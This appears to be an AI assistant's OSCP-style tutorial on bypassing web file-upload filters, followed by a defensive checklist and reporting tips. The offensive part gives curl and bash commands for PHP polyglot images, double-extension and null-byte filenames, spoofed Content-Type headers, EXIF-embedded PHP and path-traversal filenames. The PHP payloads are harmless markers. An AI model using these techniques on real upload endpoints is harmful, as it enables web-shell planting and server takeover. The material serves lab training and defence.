
# Quick reminder: what servers check

File uploads are typically filtered by one or more of:

- **File extension** (`.jpg`, `.png` only)
    
- **Content-type header** (`multipart/form-data` / `image/*`)
    
- **Magic bytes / file signature** (first bytes of the file)
    
- **MIME sniffing on server side** (reading beginning of file)
    
- **Image processing / thumbnailing** (attempt to parse image)
    
- **Filename blacklist / whitelist / normalization**
    
- **Storage path restrictions** (uploads go to non-executable dir)
    
- **Web server execution protections** (no PHP execution where files are stored)
    

Bypassing tests means targeting _which_ checks are done and in what order.

---

# Lab techniques (conceptual + examples)

> Replace `<TARGET>`, `<UPLOAD_ENDPOINT>`, and `php-test` marker as needed. Do not run these against anything you don't own.

### 1) Magic-bytes / polyglot file (image header + embedded server code)

Idea: prepend a valid image header so the file looks like an image to signature checks, but keep server-side code inside the file.

Create a polyglot locally (example uses a placeholder PHP test marker — use only in lab):

```bash
# create a GIF header + PHP test marker (lab only)
printf "GIF89a" > poly.gif.php
printf "<?php /*LAB test marker*/ echo 'OK'; ?>" >> poly.gif.php
# verify first bytes
xxd -l 8 poly.gif.php
```

Upload `poly.gif.php` (or `poly.php.gif` depending on extension filtering) and then try to fetch/execute it.

What to look for:

- If server accepts by extension and only checks header, the GIF header fools the magic-byte check.
    
- If server strips extensions, try `poly.gif` vs `poly.php.gif`.
    

### 2) Double extension / extension obfuscation

Idea: naming tricks to bypass naive extension checks:

- `shell.php.jpg`
    
- `safe.png.php`
    
- `image.jpg%00.php` _(older null-byte issues; rarely works on modern stacks)_
    

Example create + curl upload (multipart):

```bash
# create small file
printf "GIF89a<?php /*lab*/ echo 'ok'; ?>" > shell.php.jpg

# upload with curl (set filename in form)
curl -s -F "file=@shell.php.jpg;filename=shell.php.jpg" http://<TARGET>/<UPLOAD_ENDPOINT>
```

Notes:

- Modern frameworks often sanitize the final stored extension or rename files, so double extension may fail.
    

### 3) Content-Type header tampering (client side)

Idea: set `Content-Type: image/png` while sending a file that contains code.

```bash
curl -s -X POST -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;type=image/png;filename=shell.png" \
  http://<TARGET>/<UPLOAD_ENDPOINT>
```

Also try sending the `file` without an extension but with an explicit `filename=` that looks valid.

### 4) EXIF / metadata hiding (store payload in metadata)

Idea: place the payload into EXIF fields or in APPn segments of JPEG. Some image parsers ignore metadata when verifying image signature.

Tools:

- `exiftool` to add custom EXIF tags:
    

```bash
# attach test marker to EXIF comment (lab only)
exiftool -Comment="<?php /*lab*/ echo 'ok'; ?>" good.jpg
```

Then upload `good.jpg`. If the app later writes EXIF into accessible file and an include occurs, it may matter. (Mostly useful in certain image processors or misconfigured includes.)

### 5) SVG (textual image attack surface)

SVG is XML/text and often allowed as images — it can contain scripts or data URIs. In labs, you can embed payloads in SVG; in real webapps, SVG handling should be strict.

Create a minimal SVG (lab; non-malicious example):

```xml
<!-- lab.svg -->
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">
  <!-- benign marker -->
  <title>LAB-SVG</title>
</svg>
```

Upload and see whether it’s stored / executed/rendered. Note: modern servers often sanitize uploaded SVG.

### 6) Multipart boundary / chunked-encoding tampering

Idea: some servers parse the multipart body naïvely. Using custom boundaries, or omitting expected headers, can confuse simple validators — test with Burp or custom-crafted curl multipart bodies.

Example (curl with explicit content-disposition filename):

```bash
curl -v -X POST -F "file=@shell.php;filename=exploit.png" http://<TARGET>/<upload>
```

Use Burp to tamper the request body to try alternative `Content-Disposition` header values.

### 7) URL/Path encoding / Unicode tricks

Idea: send filenames with percent-encoded or Unicode chars to bypass filters that check the literal string:

- `../../../uploads/%2e%2e%2f...` (path traversal attempts — rarely works on sane servers)
    
- `файл.php.jpg` — some filters might only whitelist ASCII extensions.
    

### 8) Using image processing leniency (tiny GIF trick)

Some thumbnailers only look at a tiny initial header; craft a valid tiny image plus appended data. Prepending a tiny valid header (GIF87a/GIF89a/PNG signature) then adding payload often bypasses naive parsers.

---

# How to test / verify in lab

1. Upload the file using the app’s UI or via `curl` as above.
    
2. Check the response (200/201 + returned filename / URL).
    
3. Attempt to fetch the stored file (`curl http://<host>/uploads/<returned-name>`).
    
4. If the upload is stored in web-accessible folder and executes, you may see output (in lab only). If not executable, note that in report.
    
5. Check server logs (if you control it) to see how file was processed.
    

---

# Defensive checklist — what to look for and how to mitigate

If you’re testing as a defender or documenting findings, include:

1. **Store uploads outside webroot** — never serve uploaded files directly from an executable path.
    
2. **Enforce server-side content validation**:
    
    - Re-parse images using trusted libraries (ImageMagick with policies, GD) and reject if parsing fails.
        
    - Reject files that contain executable markers after image parsing.
        
3. **Whitelist allowed extensions and map them to safe storage names** (e.g., randomly generated filenames). Do not trust user-provided filename.
    
4. **Normalize and sanitize filenames** (strip null bytes, control chars, percent-encoding).
    
5. **Set proper permissions** on upload directories (no execute permissions).
    
6. **Disable execution** of scripts in upload directories (web server config: `Options -ExecCGI`, `php_flag engine off`, or use separate domain/subdomain).
    
7. **Use antivirus / malware scanners** on uploaded content and monitor uploads for suspicious patterns.
    
8. **Limit accepted MIME types and verify server-side** (not just Content-Type header).
    
9. **Remove EXIF and other metadata** from uploaded images if not needed.
    
10. **Rate-limit uploads and add logging/alerts** for suspicious file names and many uploads per IP.
    

Example server config note (nginx): place uploads in `/var/www/uploads` and in nginx config ensure PHP isn’t served from that directory:

```nginx
location /uploads/ {
  internal;
  # serve static only; ensure no php handling here
}
```

Or map uploads to a separate domain that has no script handling.

---

# Documentation & OSCP reporting tips

- For each bypass attempt record: request (curl/Burp), response, uploaded filename, whether the file executed or was retrievable, and server behavior.
    
- Include screenshots or `curl -v` output showing HTTP response and resulting accessible URL.
    
- Provide remediation recommendations (from defensive checklist) and severity rationale.
    

---

If you want, I can now:

- 1. **Create a lab playbook** (Docker compose + simple PHP upload app intentionally vulnerable) so you can safely practice these bypasses on a VM you control, **or**
        
- 2. **Generate a concise OSCP-style evidence template** you can paste into your exam notes for each upload test (fields: command, filename uploaded, response, path, logs, remediation).
        

Which one — lab playbook or evidence template? (Both are safe — still assume lab only.)